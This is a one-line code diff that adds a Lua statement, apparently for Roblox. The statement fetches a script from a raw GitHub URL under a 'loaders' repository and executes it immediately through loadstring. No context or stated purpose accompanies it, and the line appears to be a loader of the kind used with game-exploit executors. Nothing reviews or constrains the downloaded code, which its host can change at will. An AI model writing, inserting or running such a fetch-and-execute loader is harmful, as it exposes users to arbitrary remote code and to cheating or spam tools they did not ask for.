@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/update-x-cvr-retro-spam5-0c3r8t7hoe9udw.lua"))()
